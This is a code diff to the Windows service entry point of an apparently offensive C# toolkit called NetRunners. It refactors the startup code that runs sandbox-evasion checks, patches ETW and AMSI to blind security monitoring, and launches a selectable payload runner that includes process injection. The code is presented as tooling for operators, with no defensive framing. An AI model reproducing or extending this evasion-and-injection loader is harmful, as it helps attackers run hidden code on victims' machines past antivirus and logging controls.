@@ -1,9 +1,5 @@
 ﻿using System;
 using System.ServiceProcess;
-using NetRunners.Interfaces;
-using NetRunners.Heuristics;
-using NetRunners.Patchers;
-using NetRunners.Runners;
 
 namespace NetRunners.Svc
 {
@@ -21,16 +17,10 @@ namespace NetRunners.Svc
 
         protected override void OnStart(string[] args)
         {
-            if (!SleepHeuristic.Check() || !NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
-            {
-                return; // Exit if any checks fail or patching fails
-            }
-
-            // uncomment your choice
-            IRunner runner = new ProcessInjectionRunner();
-            //IRunner runner = new DefaultRunner();
-            //IRunner runner = new ProcessInjectionRunner();
-            runner.Run();
+            // evasion
+            NetRunners.Helpers.Helper.PerformChecks();
+            // execution
+            NetRunners.Helpers.Helper.SelectRunner();
         }
         protected override void OnStop()
         {
